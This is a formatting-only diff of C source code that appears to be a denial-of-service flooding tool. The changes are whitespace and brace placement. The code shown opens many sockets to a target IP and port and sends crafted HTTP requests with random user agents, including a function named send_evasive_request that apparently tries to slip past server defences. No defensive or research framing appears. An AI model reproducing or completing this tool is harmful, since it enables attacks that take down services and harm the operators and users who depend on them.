@@ -15,7 +15,6 @@
 
 int sockets[CONNECTIONS];
 
-
 static int create_socket()
 {
     int sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -32,7 +31,7 @@ static int connect_to_target(int sock, struct sockaddr_in *server)
 {
     if (sock < 0)
         return -1;
-    
+
     if (connect(sock, (struct sockaddr *)server, sizeof(*server)) < 0)
     {
 #ifdef DEBUG
@@ -53,7 +52,7 @@ static void send_http_request(int sock, char *target_ip)
              "User-Agent: %s\r\n"
              "Accept-language: en-US,en,q=0.5\r\n\r\n",
              target_ip, get_random_user_agent());
-    
+
     if (send(sock, request, strlen(request), 0) < 0)
     {
         close(sock);
@@ -75,7 +74,7 @@ static void send_evasive_request(int sock, char *target_ip)
              "Content-Length: 10\r\n\r\n"
              "abcdefghij",
              target_ip, get_random_user_agent());
-    
+
     if (send(sock, request, strlen(request), 0) < 0)
     {
         close(sock);
@@ -87,8 +86,7 @@ static void setup_connection(int index, char *target_ip, int target_port)
     struct sockaddr_in server = {
         .sin_family = AF_INET,
         .sin_port = htons(target_port),
-        .sin_addr.s_addr = inet_addr(target_ip)
-    };
+        .sin_addr.s_addr = inet_addr(target_ip)};
 
     int sock = create_socket();
     sock = connect_to_target(sock, &server);
